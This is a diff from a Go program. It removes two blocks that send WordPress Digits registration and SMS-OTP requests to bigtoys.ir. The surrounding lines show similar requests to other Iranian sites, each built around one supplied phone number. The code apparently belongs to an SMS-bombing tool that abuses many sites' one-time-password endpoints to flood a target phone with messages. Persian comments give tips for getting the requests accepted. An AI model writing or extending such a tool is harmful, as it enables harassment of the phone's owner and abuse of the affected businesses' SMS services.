@@ -280,61 +280,6 @@ func main() {
 			sendFormRequest(ctx, "https://livarfars.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
 		}
 
-		// bigtoys.ir - Variation 2 (Form)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("action_type", "phone")
-			formData.Set("digt_countrycode", "+98")
-			formData.Set("phone", strings.TrimPrefix(phone, "0")) // اغلب این وبسرویس ها شماره را بدون صفر اول میخواهند
-			formData.Set("email", "")
-			formData.Set("digits_reg_name", "abcdefghl")
-			formData.Set("digits_reg_password", "qzF8w7UAZusAJdg") // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
-			formData.Set("digits_process_register", "1")
-			formData.Set("optional_email", "")
-			formData.Set("is_digits_optional_data", "1")
-			formData.Set("instance_id", "a1512cc9b4a4d1f6219e3e2392fb9222") // این مقدار ممکن است داینامیک باشد
-			formData.Set("optional_data", "email")
-			formData.Set("action", "digits_forms_ajax")
-			formData.Set("type", "register")
-			formData.Set("dig_otp", "")
-			formData.Set("digits", "1")
-			formData.Set("digits_redirect_page", "//www.bigtoys.ir/") // ممکن است نیاز به URL Encode داشته باشد
-			formData.Set("digits_form", "3bed3c0f10")                // این مقدار ممکن است داینامیک باشد
-			formData.Set("_wp_http_referer", "/")
-			sendFormRequest(ctx, "https://www.big.toys.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
-		}//⚠️
-
-		// bigtoys.ir - Variation 3 (Form)
-		wg.Add(1)
-		tasks <- func() {
-			formData := url.Values{}
-			formData.Set("action_type", "phone")
-			formData.Set("digt_countrycode", "+98")
-			formData.Set("phone", strings.TrimPrefix(phone, "0")) // اغلب این وبسرویس ها شماره را بدون صفر اول میخواهند
-			formData.Set("email", "")
-			formData.Set("digits_reg_name", "abcdefghl")
-			formData.Set("digits_reg_password", "qzF8w7UAZusAJdg") // این مقدار ممکن است نیاز به تولید داینامیک داشته باشد
-			formData.Set("digits_process_register", "1")
-			formData.Set("optional_email", "")
-			formData.Set("is_digits_optional_data", "1")
-			formData.Set("sms_otp", "")
-			formData.Set("otp_step_1", "1")
-			formData.Set("signup_otp_mode", "1")
-			formData.Set("instance_id", "a1512cc9b4a4d1f6219e3e2392fb9222") // این مقدار ممکن است داینامیک باشد
-			formData.Set("optional_data", "email")
-			formData.Set("action", "digits_forms_ajax")
-			formData.Set("type", "register")
-			formData.Set("dig_otp", "")
-			formData.Set("digits", "1")
-			formData.Set("digits_redirect_page", "//www.bigtoys.ir/") // ممکن است نیاز به URL Encode داشته باشد
-			formData.Set("digits_form", "3bed3c0f10")                // این مقدار ممکن است داینامیک باشد
-			formData.Set("_wp_http_referer", "/")
-			formData.Set("container", "digits_protected")
-			formData.Set("sub_action", "sms_otp")
-			sendFormRequest(ctx, "https://www.bigtoys.ir/wp-admin/admin-ajax.php", formData, &wg, ch)
-		}
-
 		// ashraafi.com (Form)
 		wg.Add(1)
 		tasks <- func() {
